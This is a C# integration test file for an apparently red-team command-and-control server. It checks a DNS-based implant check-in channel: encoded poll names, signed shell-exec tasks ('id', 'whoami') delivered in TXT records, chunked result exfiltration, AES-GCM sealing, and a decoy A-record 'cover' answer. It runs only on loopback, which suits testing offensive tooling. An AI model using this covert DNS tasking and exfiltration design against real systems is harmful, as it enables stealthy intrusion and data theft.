using System.Net;
using System.Net.Http.Json;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Google.Protobuf;
using Grpc.Net.Client;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.CoreState;
using Rod.CoreState.Engagements;
using Rod.CoreState.Implants;
using Rod.CoreState.Operators;
using Rod.CoreState.Pki;
using Rod.Audit;
using Rod.Transport;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners;
using Rod.Transport.Listeners.Dns;
using Rod.Transport.Payloads;
using Rod.V1;

namespace Rod.Integration.Tests;

/// <summary>
/// The DNS check-in surface (architecture.md Sec 8): the codec, the name
/// grammar, and the acceptance point -- an implant checks in over DNS against
/// a real listener entry. The unit checks pin the wire shapes; the end-to-end
/// check drives a real UDP socket against a real listener entry: a from-
/// scratch implant (a hand-rolled DNS client speaking the documented
/// contract) enrolls over HTTP, opens its session on the mTLS beacon, then
/// polls and reports over DNS -- presence advances, a queued task arrives as
/// a signed TaskRequest in TXT, and its result lands in the audit trail.
/// </summary>
public class DnsCheckInTests
{
    private const string Zone = "c2.example.test";

    // --- The codec: query parse and response encode round-trip. ---

    [Fact]
    public void Codec_RoundTripsAQuery()
    {
        var query = BuildQuery(0x1234, DnsCheckInNames.PollName(ImplantId.New(), Zone));

        var parsed = DnsCodec.ParseQuery(query);

        Assert.NotNull(parsed);
        Assert.Equal((ushort)0x1234, parsed!.Id);
        Assert.Equal(DnsCodec.TxtType, parsed.Question!.Type);
        Assert.StartsWith("p.", parsed.Question.Name);
        Assert.EndsWith(Zone, parsed.Question.Name);
    }

    [Fact]
    public void Codec_EncodesATxtResponseWithEdns0()
    {
        var response = new DnsMessage
        {
            Id = 42,
            Question = new DnsQuestion("p." + Zone, DnsCodec.TxtType, 1),
            ResponseCode = 0,
        };
        response.Answers.Add(new DnsTxtAnswer("p." + Zone, new[] { "abc", "def" }));

        var datagram = DnsCodec.EncodeResponse(response);

        // QR set, one answer; a real resolver parses it -- here we assert the
        // structural bits: the header flags and the TXT strings survive.
        Assert.NotEqual(0, datagram[2] & 0x80);
        var answerCount = (datagram[6] << 8) | datagram[7];
        Assert.Equal(1, answerCount);
        var text = Encoding.ASCII.GetString(datagram);
        Assert.Contains("abc", text);
        Assert.Contains("def", text);
    }

    [Fact]
    public void Codec_RejectsGarbage()
    {
        Assert.Null(DnsCodec.ParseQuery(new byte[] { 1, 2, 3 }));
        Assert.Null(DnsCodec.ParseQuery(new byte[12]));
    }

    [Fact]
    public void Codec_EncodesAnACoverAnswer()
    {
        var response = new DnsMessage
        {
            Id = 7,
            Question = new DnsQuestion("www." + Zone, DnsCodec.AType, 1),
            ResponseCode = 0,
        };
        response.AAnswers.Add(new DnsAAnswer("www." + Zone, IPAddress.Parse("203.0.113.10")));

        var datagram = DnsCodec.EncodeResponse(response);

        var answerCount = (datagram[6] << 8) | datagram[7];
        Assert.Equal(1, answerCount);
        Assert.Contains("www", Encoding.ASCII.GetString(datagram));
        // The rdata carries the four address bytes contiguously.
        Assert.True(ContainsSequence(datagram, new byte[] { (byte)203, (byte)0, (byte)113, (byte)10 }));
    }

    // Byte-subsequence search for wire assertions: the codecs carry no
    // offsets out, so rdata checks locate the bytes.
    private static bool ContainsSequence(byte[] hay, byte[] needle)
    {
        for (var offset = 0; offset + needle.Length <= hay.Length; offset++)
        {
            var match = true;
            for (var probe = 0; probe < needle.Length; probe++)
            {
                if (hay[offset + probe] != needle[probe])
                {
                    match = false;
                    break;
                }
            }
            if (match)
                return true;
        }
        return false;
    }

    // --- The name grammar. ---

    [Fact]
    public void Grammar_PollRoundTrips()
    {
        var implant = ImplantId.New();

        var parsed = DnsCheckInNames.TryParsePoll(DnsCheckInNames.PollName(implant, Zone), Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Null(DnsCheckInNames.TryParsePoll("x." + Zone, Zone));
        Assert.Null(DnsCheckInNames.TryParsePoll("p." + DnsCheckInNames.Encode(implant.ToString()) + ".other.test", Zone));
    }

    [Fact]
    public void Grammar_SealedPollRoundTrips()
    {
        var implant = ImplantId.New();
        var keyId = Guid.NewGuid();

        var parsed = DnsCheckInNames.TryParseSealedPoll(DnsCheckInNames.SealedPollName(implant, keyId, Zone), Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(keyId, parsed.KeyId);
        // The plain poll parser does not claim a k-name, and the sealed parser
        // does not claim a p-name: the two carriages stay disjoint.
        Assert.Null(DnsCheckInNames.TryParsePoll(DnsCheckInNames.SealedPollName(implant, keyId, Zone), Zone));
        Assert.Null(DnsCheckInNames.TryParseSealedPoll(DnsCheckInNames.PollName(implant, Zone), Zone));
        Assert.Null(DnsCheckInNames.TryParseSealedPoll("k." + DnsCheckInNames.Encode(implant.ToString()) + "." + Zone, Zone));
    }

    [Fact]
    public void Grammar_ResultChunkRoundTrips()
    {
        var implant = ImplantId.New();
        var task = TaskId.New();
        var chunk = Encoding.UTF8.GetBytes("uid=0(root)");

        var name = DnsCheckInNames.ResultName(implant, task, succeeded: true, sequence: 0, terminal: true, chunk, Zone);
        var parsed = DnsCheckInNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Equal(implant, parsed!.Implant);
        Assert.Equal(task, parsed.Task);
        Assert.Equal(Rod.CoreState.Tasks.TaskOutcome.Succeeded, parsed.Outcome);
        Assert.Equal(0, parsed.Sequence);
        Assert.True(parsed.Terminal);
        Assert.Equal(chunk, parsed.Chunk);
    }

    [Fact]
    public void Grammar_EmptyChunkRidesAsTheBareLabel()
    {
        var name = DnsCheckInNames.ResultName(
            ImplantId.New(), TaskId.New(), succeeded: false, sequence: 0, terminal: true, Array.Empty<byte>(), Zone);

        var parsed = DnsCheckInNames.TryParseResult(name, Zone);

        Assert.NotNull(parsed);
        Assert.Empty(parsed!.Chunk);
    }

    [Fact]
    public void Reassembler_ConcatenatesInOrder_AndDropsGaps()
    {
        var reassembler = new DnsCheckInNames.ResultReassembler();
        var task = TaskId.New();
        Assert.Null(reassembler.Add(task, 0, terminal: false, Encoding.UTF8.GetBytes("uid=")));
        Assert.Null(reassembler.Add(task, 1, terminal: false, Encoding.UTF8.GetBytes("0(")));

        var output = reassembler.Add(task, 2, terminal: true, Encoding.UTF8.GetBytes("root)"));
        Assert.NotNull(output);
        Assert.Equal("uid=0(root)", Encoding.UTF8.GetString(output!));

        // A terminal chunk with a gap before it reassembles nothing.
        var gapped = reassembler.Add(TaskId.New(), 1, terminal: true, Encoding.UTF8.GetBytes("orphan"));
        Assert.Null(gapped);
    }

    // --- The acceptance point: an implant checks in over DNS. ---

    [Fact]
    public async Task Cover_AnAQueryInTheZoneAnswersAnAddress()
    {
        await using var env = await DnsTestEnv.StartAsync();

        // An A query for an unknown name in the zone: NOERROR with one A
        // record -- the ordinary v4-zone shape, not the TXT-only oddity an
        // NXDOMAIN-everything zone reads as. The test env binds 127.0.0.1,
        // so the cover address is the bind's own host.
        var datagram = await env.DnsQueryRawAsync("www." + Zone, DnsCodec.AType);
        Assert.True(datagram.Length >= 12);
        Assert.Equal(0, datagram[3] & 0x0F);
        Assert.Equal(1, (datagram[6] << 8) | datagram[7]);
        Assert.True(ContainsSequence(datagram, new byte[] { 127, 0, 0, 1 }));

        // A repeat answers the same address: the cover is deterministic,
        // the behavior resolvers cache by.
        var again = await env.DnsQueryRawAsync("www." + Zone, DnsCodec.AType);
        Assert.Equal(0, again[3] & 0x0F);
        Assert.True(ContainsSequence(again, new byte[] { 127, 0, 0, 1 }));

        // AAAA stays NXDOMAIN: a v4-only zone is the ordinary shape, and
        // inventing v6 records adds no cover.
        var aaaa = await env.DnsQueryRawAsync("www." + Zone, 28);
        Assert.Equal(3, aaaa[3] & 0x0F);

        // A TXT query for a non-check-in name keeps its NXDOMAIN: the cover
        // widens the zone's record types, not the check-in surface.
        var txt = await env.DnsQueryAsync("www." + Zone);
        Assert.Null(txt);
    }

    [Fact]
    public async Task Implant_ChecksInOverDns_AgainstARealListenerEntry()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var (implant, leafCert, leafKey) = await env.EnrollImplantAsync();

        // The implant opens its session on the mTLS beacon first: DNS refreshes
        // a session, it does not handshake (the documented transport tradeoff).
        using var channel = env.ConnectBeacon(leafCert, leafKey);
        var client = new Beacon.BeaconClient(channel);
        var call = client.CheckIn();
        await call.RequestStream.WriteAsync(HandshakeFrame(implant.Id));
        Assert.True(await call.ResponseStream.MoveNext(TestSupport.BeaconDeadline()));
        Assert.Equal(HandshakeStatus.Ok, HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload).Status);
        await call.RequestStream.CompleteAsync();

        // A queued task is claimed over DNS: the poll answer carries the
        // signed TaskRequest in TXT, base32 across its strings.
        await env.LoginAsync();

        // The DNS listener entry is real in the registry: Running, Dns, our
        // zone. Read through the registry: the listener rides the startup
        // configuration, and the engagement-scoped listing does not (and must
        // not) surface that tier.
        var registry = env.Host.Services.GetRequiredService<IListenerRegistry>();
        Assert.Contains(await registry.ListAsync(), l =>
            l.Transport == "dns"
            && l.State == ListenerState.Running
            && l.PublicEndpoint == Zone);

        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        var pollAnswer = await env.DnsQueryAsync(DnsCheckInNames.PollName(implant.Id, Zone));
        Assert.NotNull(pollAnswer);
        Assert.True(DnsCheckInNames.TryDecode(pollAnswer, out var framed));
        // The poll answer carries a kind byte ahead of its message: 't' names
        // the TaskRequest ('i' would name parked channel input).
        Assert.Equal((byte)'t', framed![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(framed[1..]);
        Assert.Equal(issuedBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("shell.exec", taskRequest.Verb);
        Assert.Equal("id", taskRequest.Arguments);

        // The tasking signature verifies with the CA's public key even over
        // DNS: the datagram transport does not weaken the Sec 9 posture. The
        // signed bytes are the canonical tuple (architecture.md Sec 9), not
        // the serialized message.
        Assert.True(VerifyTasking(env.CaCertificates()[0], implant.Id.ToString(), taskRequest));

        // The implant reports the result as DNS chunks; the task completes
        // with the same audit arc a stream-delivered result produces.
        var output = "uid=0(root) gid=0(root)";
        var chunks = Chunk(Encoding.UTF8.GetBytes(output), 20);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
                implant.Id, Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal("Succeeded", fetched.Outcome);
        Assert.Equal(output, fetched.Output);

        // Presence advanced over DNS: the session's last-seen reflects the
        // check-ins (the implant reads online with no beacon frames in flight).
        var implants = await env.Http.GetFromJsonAsync<ImplantBody[]>(
            $"/engagements/{implant.EngagementId}/implants");
        Assert.Contains(implants!, i => i.ImplantId == implant.Id.ToString() && i.IsOnline);
    }

    [Fact]
    public async Task Sealed_KeyedArtifact_PollsAndReportsUnderCiphertext()
    {
        await using var env = await DnsTestEnv.StartAsync();
        var (implant, leafCert, leafKey) = await env.EnrollImplantAsync();
        using var channel = env.ConnectBeacon(leafCert, leafKey);
        var client = new Beacon.BeaconClient(channel);
        var call = client.CheckIn();
        await call.RequestStream.WriteAsync(HandshakeFrame(implant.Id));
        Assert.True(await call.ResponseStream.MoveNext(TestSupport.BeaconDeadline()));
        Assert.Equal(HandshakeStatus.Ok, HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload).Status);
        await call.RequestStream.CompleteAsync();

        // The artifact's build minted an envelope key: the payload record
        // carries the teamserver's half, and the enrollment bound the implant
        // to it -- the state a k-poll re-derives on its own after a restart.
        var (keyId, key) = AesGcmEnvelope.Mint();
        var payloads = env.Host.Services.GetRequiredService<IPayloadStore>();
        await payloads.SaveAsync(new PayloadRecord(
            Guid.NewGuid(), implant.EngagementId.Value, "dotnet", "csharp",
            "application/octet-stream", "sealed-test", Array.Empty<byte>(), 0, DateTimeOffset.UtcNow,
            EnvelopeKeyId: keyId, EnvelopeKey: key), CancellationToken.None);
        env.Host.Services.GetRequiredService<EnvelopeCheckInKeys>().Bind(implant.Id, keyId, key);

        await env.LoginAsync();
        var issued = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
        issued.EnsureSuccessStatusCode();
        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();

        // The downgrade refusal: a plain p-poll from a key-bound implant
        // answers nothing -- the tasking is never handed down in the clear.
        Assert.Null(await env.DnsQueryAsync(DnsCheckInNames.PollName(implant.Id, Zone)));

        // The k-poll's answer is a raw R1 body under the DNS poll purpose
        // tag: no kind byte, no protobuf, nothing readable rides the wire.
        var sealedAnswer = await env.DnsQueryAsync(DnsCheckInNames.SealedPollName(implant.Id, keyId, Zone));
        Assert.NotNull(sealedAnswer);
        Assert.True(DnsCheckInNames.TryDecode(sealedAnswer, out var sealedBytes));
        Assert.True(sealedBytes!.Length >= 2 && sealedBytes[0] == (byte)'R' && sealedBytes[1] == (byte)'1');
        var opened = AesGcmEnvelope.TryUnwrapBody(sealedBytes, keyId, key, AesGcmEnvelope.DnsPollAad);
        Assert.NotNull(opened);
        Assert.Equal((byte)'t', opened![0]);
        var taskRequest = TaskRequest.Parser.ParseFrom(opened[1..]);
        Assert.Equal(issuedBody!.TaskId, taskRequest.TaskId);
        Assert.Equal("shell.exec", taskRequest.Verb);
        Assert.Equal("id", taskRequest.Arguments);

        // The result seals whole under the result purpose tag, then chunks;
        // the task completes with the plaintext the server unwrapped.
        var output = "uid=0(root) gid=0(root)";
        var blob = AesGcmEnvelope.WrapBody(Encoding.UTF8.GetBytes(output), keyId, key, AesGcmEnvelope.DnsResultAad);
        var chunks = Chunk(blob, 20);
        for (var i = 0; i < chunks.Count; i++)
        {
            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
                implant.Id, Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
        }

        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
        Assert.NotNull(fetched);
        Assert.Equal("Completed", fetched!.Status);
        Assert.Equal("Succeeded", fetched.Outcome);
        Assert.Equal(output, fetched.Output);

        // The upstream refusal: a plaintext reassembly from the bound implant
        // is dropped, so a task never completes off cleartext chunks. The
        // drop is decided inside the r-query's own answer cycle -- the
        // response datagram cannot precede it -- so one read settles it.
        var issuedPlain = await env.Http.PostAsJsonAsync(
            $"/engagements/{implant.EngagementId}/tasks",
            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "whoami" });
        issuedPlain.EnsureSuccessStatusCode();
        var issuedPlainBody = await issuedPlain.Content.ReadFromJsonAsync<TaskIssuedBody>();
        Assert.NotNull(await env.DnsQueryAsync(DnsCheckInNames.SealedPollName(implant.Id, keyId, Zone)));

        var plain = Chunk(Encoding.UTF8.GetBytes("forged plaintext output"), 20);
        for (var i = 0; i < plain.Count; i++)
        {
            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
                implant.Id, Guid.TryParse(issuedPlainBody!.TaskId, out var pid) ? new TaskId(pid) : TaskId.New(),
                succeeded: true, sequence: i, terminal: i == plain.Count - 1, plain[i], Zone));
        }
        var plainFetched = await env.Http.GetFromJsonAsync<TaskBody>(
            $"/engagements/{implant.EngagementId}/tasks/{issuedPlainBody!.TaskId}");
        Assert.NotNull(plainFetched);
        Assert.NotEqual("Completed", plainFetched!.Status);
    }

    private static List<byte[]> Chunk(byte[] bytes, int size)
    {
        var chunks = new List<byte[]>();
        for (var offset = 0; offset < bytes.Length; offset += size)
        {
            var end = Math.Min(offset + size, bytes.Length);
            var slice = new byte[end - offset];
            Array.Copy(bytes, offset, slice, 0, slice.Length);
            chunks.Add(slice);
        }
        return chunks;
    }

    // The Tier 1 verification an implant performs (extending/implants.md):
    // RSASSA-PSS/SHA-256 over the canonical little-endian length-prefixed
    // tuple, verified with the CA's public key.
    private static bool VerifyTasking(X509Certificate2 ca, string implantId, TaskRequest request)
    {
        using var rsa = ca.GetRSAPublicKey()!;
        var canonical = new MemoryStream();
        foreach (var value in new[] { implantId, request.TaskId, request.Verb, request.Arguments })
        {
            var bytes = Encoding.UTF8.GetBytes(value);
            canonical.Write(BitConverter.GetBytes((uint)bytes.Length), 0, 4);
            canonical.Write(bytes, 0, bytes.Length);
        }
        return rsa.VerifyData(
            canonical.ToArray(), request.Signature.Span,
            HashAlgorithmName.SHA256, RSASignaturePadding.Pss);
    }

    private static Frame HandshakeFrame(ImplantId implant)
    {
        var request = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implant.ToString(),
            Capabilities = { "shell.exec" },
        };
        return new Frame { Payload = ByteString.CopyFrom(request.ToByteArray()) };
    }

    // Builds one query datagram of the asked type: header, question, and an
    // EDNS0 OPT record so the response may carry the signed TaskRequest.
    private static byte[] BuildQuery(ushort id, string name, ushort type = DnsCodec.TxtType)
    {
        var buffer = new List<byte>(128);
        buffer.Add((byte)(id >> 8));
        buffer.Add((byte)id);
        buffer.Add(0); // flags: query, recursion desired
        buffer.Add(1);
        buffer.Add(0); buffer.Add(1); // qdcount
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(1); // arcount: the OPT record

        foreach (var label in name.Split('.'))
        {
            buffer.Add((byte)label.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(label));
        }
        buffer.Add(0);
        buffer.Add((byte)(type >> 8));
        buffer.Add((byte)type);
        buffer.Add(0); buffer.Add(1);

        // OPT: root name, type 41, class = payload size, no data.
        buffer.Add(0);
        buffer.Add(0); buffer.Add(41);
        buffer.Add(4); buffer.Add(208); // 1232
        buffer.Add(0); buffer.Add(0); buffer.Add(0); buffer.Add(0);
        buffer.Add(0); buffer.Add(0);
        return buffer.ToArray();
    }

    private static async Task<T?> WaitUntilAsync<T>(Func<Task<T?>> read) where T : class
    {
        var deadline = DateTimeOffset.UtcNow + TimeSpan.FromSeconds(5);
        while (DateTimeOffset.UtcNow < deadline)
        {
            var value = await read();
            if (value is not null && Matches(value))
                return value;
            await Task.Delay(25);
        }
        throw new TimeoutException("The DNS check-in state was not observed in time.");
    }

    private static bool Matches<T>(T value) where T : class
        => value switch
        {
            TaskBody t => t.Status == "Completed",
            _ => true,
        };

    private sealed class TaskBody
    {
        public string Status { get; set; } = "";
        public string? Outcome { get; set; }
        public string? Output { get; set; }
    }

    private sealed class TaskIssuedBody
    {
        public string TaskId { get; set; } = "";
    }

    private sealed class ListenerBody
    {
        public string Transport { get; set; } = "";
        public string State { get; set; } = "";
        public string PublicEndpoint { get; set; } = "";
    }

    private sealed class ImplantBody
    {
        public string ImplantId { get; set; } = "";
        public bool IsOnline { get; set; }
    }

    /// <summary>
    /// A real teamserver with the HTTP operator API, the mTLS beacon, and one
    /// DNS listener entry (a real UDP socket on a free loopback port, zone
    /// c2.example.test). The DNS client is the "from-scratch implant" half of
    /// the test: raw UDP with the codec's query builder and a TXT-answer
    /// parser, speaking nothing but the documented contract.
    /// </summary>
    private sealed class DnsTestEnv : IAsyncDisposable
    {
        public IHost Host { get; private set; } = null!;
        public HttpClient Http { get; private set; } = null!;
        public int MtlsPort { get; private set; }
        public int HttpPort { get; private set; }
        public int DnsPort { get; private set; }
        private UdpClient _dns = null!;
        private IImplantCertificateAuthority _ca = null!;

        public static async Task<DnsTestEnv> StartAsync()
        {
            var env = new DnsTestEnv();
            env.MtlsPort = FreePort();
            env.HttpPort = FreePort();
            env.DnsPort = FreePort();

            var config = AuthenticatedHost.BuildConfig();
            env.Host = TransportHost.CreateHostBuilder(
                    configureServices: services => AuthenticatedHost.ComposeServices(services, config),
                    mapEndpoints: endpoints => AuthenticatedHost.ComposeEndpoints(endpoints),
                    configuration: config)
                .ConfigureWebHost(webBuilder => webBuilder
                    .UseRodListeners(new List<ListenerConfig>
                    {
                        new("test-mtls", "mtls", $"127.0.0.1:{env.MtlsPort}", $"127.0.0.1:{env.MtlsPort}"),
                        new("test-dns", "dns", $"127.0.0.1:{env.DnsPort}", Zone),
                    })
                    .ConfigureKestrel(kestrel => kestrel.ListenLocalhost(env.HttpPort)))
                .Build();
            await env.Host.StartAsync();
            env._ca = env.Host.Services.GetRequiredService<IImplantCertificateAuthority>();

            env.Http = new HttpClient(new CookieHandler(new HttpClientHandler()))
            {
                BaseAddress = new Uri($"http://127.0.0.1:{env.HttpPort}"),
            };
            env._dns = new UdpClient();
            env._dns.Connect(IPAddress.Loopback, env.DnsPort);
            return env;
        }

        public IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> CaCertificates()
            => new[] { _ca.GetCaCertificate() };

        public async Task LoginAsync() => await AuthenticatedHost.LoginAsync(Http);

        public async Task<(Implant Implant, X509Certificate2 Leaf, ECDsa LeafKey)> EnrollImplantAsync()
        {
            var implants = Host.Services.GetRequiredService<IImplantRepository>();
            var engagements = Host.Services.GetRequiredService<IEngagementRepository>();
            var engagement = Engagement.Create(EngagementId.New(), "dns-test", OperatorId.New(), DateTimeOffset.UtcNow);
            await engagements.SaveAsync(engagement);
            var implant = Implant.Enroll(
                ImplantId.New(), engagement.Id, DateTimeOffset.UtcNow.AddDays(30), ImplantClass.Stage2, DateTimeOffset.UtcNow);
            await implants.SaveAsync(implant);

            var leafKey = ECDsa.Create(ECCurve.NamedCurves.nistP256);
            var issued = await _ca.IssueWithKeyAsync(
                new ImplantCertificateSubject(implant.Id, implant.EngagementId), leafKey, CancellationToken.None);
            return (implant, X509CertificateLoader.LoadCertificate(issued.Leaf), leafKey);
        }

        public GrpcChannel ConnectBeacon(X509Certificate2 leaf, ECDsa leafKey)
        {
            var leafWithKey = TestSupport.BeaconClientCertificate(leaf, leafKey);
            var ca = _ca.GetCaCertificate();
            var handler = new SocketsHttpHandler();
            handler.SslOptions = new System.Net.Security.SslClientAuthenticationOptions
            {
                ClientCertificates = new X509CertificateCollection { leafWithKey },
                RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                {
                    if (cert is null)
                        return false;
                    chain!.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
                    chain!.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
                    chain!.ChainPolicy.ExtraStore.Add(ca);
                    return chain.Build((X509Certificate2)cert);
                },
            };
            return GrpcChannel.ForAddress($"https://127.0.0.1:{MtlsPort}", new GrpcChannelOptions
            {
                HttpHandler = handler,
                DisposeHttpClient = true,
            });
        }

        /// <summary>
        /// One check-in exchange: send the query, read the answer, return the
        /// concatenated TXT strings (null when the answer carries none).
        /// </summary>
        public async Task<string?> DnsQueryAsync(string name)
        {
            var response = await DnsQueryRawAsync(name, DnsCodec.TxtType);
            return ParseTxtAnswer(response, name);
        }

        /// <summary>
        /// One exchange for any query type: the raw response datagram, for
        /// the assertions a TXT string parse cannot express (A-record
        /// rdata, rcodes outside the TXT path).
        /// </summary>
        public async Task<byte[]> DnsQueryRawAsync(string name, ushort type)
        {
            var query = BuildQuery((ushort)Random.Shared.Next(1, ushort.MaxValue), name, type);
            await _dns.SendAsync(query, query.Length);

            using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            return (await _dns.ReceiveAsync(timeout.Token)).Buffer;
        }

        // Reads the first TXT answer's concatenated strings off a response.
        private static string? ParseTxtAnswer(byte[] datagram, string questionName)
        {
            if (datagram.Length < 12)
                return null;
            var ancount = (datagram[6] << 8) | datagram[7];
            if (ancount == 0)
                return null;
            var offset = 12;
            // Skip the question (uncompressed on our wire, but honor pointers).
            SkipName(datagram, ref offset);
            offset += 4;
            SkipName(datagram, ref offset);
            offset += 8; // answer type, class, ttl -- rdlength follows
            if (offset + 2 > datagram.Length)
                return null;
            var rdlength = (datagram[offset] << 8) | datagram[offset + 1];
            offset += 2;
            var end = offset + rdlength;
            var payload = new StringBuilder();
            while (offset < end && offset < datagram.Length)
            {
                var length = datagram[offset++];
                payload.Append(Encoding.ASCII.GetString(datagram, offset, length));
                offset += length;
            }
            _ = questionName;
            return payload.ToString();
        }

        private static void SkipName(byte[] datagram, ref int offset)
        {
            while (offset < datagram.Length)
            {
                var length = datagram[offset];
                if (length == 0)
                {
                    offset++;
                    return;
                }
                if ((length & 0xC0) == 0xC0)
                {
                    offset += 2;
                    return;
                }
                offset += 1 + length;
            }
        }

        public async ValueTask DisposeAsync()
        {
            _dns?.Dispose();
            Http?.Dispose();
            if (Host is not null)
                await Host.StopAsync();
            Host?.Dispose();
        }
    }

    private static int FreePort()
    {
        using var listener = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
        listener.Start();
        var port = ((IPEndPoint)listener.LocalEndpoint).Port;
        listener.Stop();
        return port;
    }
}
